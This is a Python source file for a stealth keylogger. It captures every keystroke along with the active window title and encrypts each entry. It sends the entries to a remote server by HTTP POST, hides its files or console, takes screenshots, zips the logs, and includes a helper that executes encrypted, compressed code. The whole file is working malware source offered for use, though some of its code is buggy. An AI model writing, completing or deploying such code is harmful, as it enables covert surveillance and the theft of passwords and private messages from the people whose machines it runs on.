import pynput.keyboard
import os
import subprocess
import threading
import time
import uuid
import datetime
import base64
import zlib
import pyaes
import requests
import win32gui
import win32process
import zipfile
import pyscreenshot as ImageGrab

# Key for AES encryption (must be 16, 24, or 32 bytes long)
AES_KEY = b'your_secret_AES_key'  # Change this to your own key

LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
LOG_INTERVAL = 60  # Default log interval in seconds
LAST_LOG_TIME = time.time()
LOCK = threading.Lock()

# Remote server URL to send logs
REMOTE_URL = 'https://example.com/log_keystrokes'

# Configuration options
CONFIG = {
    'log_file_location': os.path.join(LOG_DIR, "keylog_" + str(uuid.uuid4()) + ".txt"),
    'log_interval': LOG_INTERVAL,
    'keys_to_ignore': [],
    'stealth_mode': True,
    'compression': True,
    'logging_application_focus': True,
    'screenshot_capture': True,
    'encrypted_communication': True
}

def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.encrypt(data)

def decrypt(encrypted_data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.decrypt(encrypted_data)

def encrypt_code(code):
    compressed_code = zlib.compress(code)
    encrypted_code = encrypt(compressed_code)
    return base64.b64encode(encrypted_code)

def decrypt_code(encrypted_code):
    decrypted_code = decrypt(base64.b64decode(encrypted_code))
    decompressed_code = zlib.decompress(decrypted_code)
    return decompressed_code

def execute_encrypted_code(encrypted_code):
    try:
        decrypted_code = decrypt_code(encrypted_code)
        exec(decrypted_code, globals())
    except Exception as e:
        print(f"Error executing encrypted code: {e}")

def write_to_file(key):
    global LAST_LOG_TIME
    with LOCK:
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = ""
            if CONFIG['logging_application_focus']:
                window_title = get_active_window_title()
            log_entry = f"[{timestamp}] [{window_title}] {key}\n"
            encrypted_entry = encrypt(log_entry.encode())
            if CONFIG['encrypted_communication']:
                send_to_server(base64.b64encode(encrypted_entry).decode())
            else:
                send_to_server(encrypted_entry.decode())
            with open(CONFIG['log_file_location'], "a") as f:
                f.write(log_entry)
            LAST_LOG_TIME = time.time()
        except Exception as e:
            with open("error_log.txt", "a") as error_file:
                error_file.write(f"Error writing to file: {e}\n")

def send_to_server(log):
    try:
        response = requests.post(REMOTE_URL, data={'log': log})
        if response.status_code != 200:
            raise Exception(f"Server returned non-200 status code: {response.status_code}")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error sending log to server: {e}\n")

def create_log_dir():
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error creating log directory: {e}\n")

def hide_console():
    try:
        if os.name == "nt":
            subprocess.call("attrib +h " + os.path.join(LOG_DIR, LOG_FILE_NAME), shell=True)
        else:
            os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Python\" to false'")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error hiding console: {e}\n")

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    pid = win32process.GetWindowThreadProcessId(window)[1]
    handle = win32process.OpenProcess(0x0410, False, pid)
    title = win32gui.GetWindowText(window)
    return title

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        with open(os.path.join(LOG_DIR, "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
            screenshot.save(f, "PNG")
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error capturing screenshot: {e}\n")

def start_keylogger():
    try:
        create_log_dir()
        if CONFIG['stealth_mode']:
            hide_console()
        with pynput.keyboard.Listener(on_press=write_to_file) as listener:
            listener.join()
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error starting keylogger: {e}\n")

def check_log_time():
    global LAST_LOG_TIME
    while True:
        if time.time() - LAST_LOG_TIME >= CONFIG['log_interval']:
            write_to_file(" ")
        time.sleep(1)

def compress_logs():
    try:
        with zipfile.ZipFile(os.path.join(LOG_DIR, "logs.zip"), 'w') as zipf:
            for root, dirs, files in os.walk(LOG_DIR):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), LOG_DIR))
    except Exception as e:
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"Error compressing logs: {e}\n")

if __name__ == "__main__":
    start_keylogger()
    threading.Thread(target=check_log_time, daemon=True).start()
    if CONFIG['screenshot_capture']:
        threading.Thread(target=capture_screenshot, daemon=True).start()
    if CONFIG['compression']:
        threading.Thread(target=compress_logs, daemon=True).start()
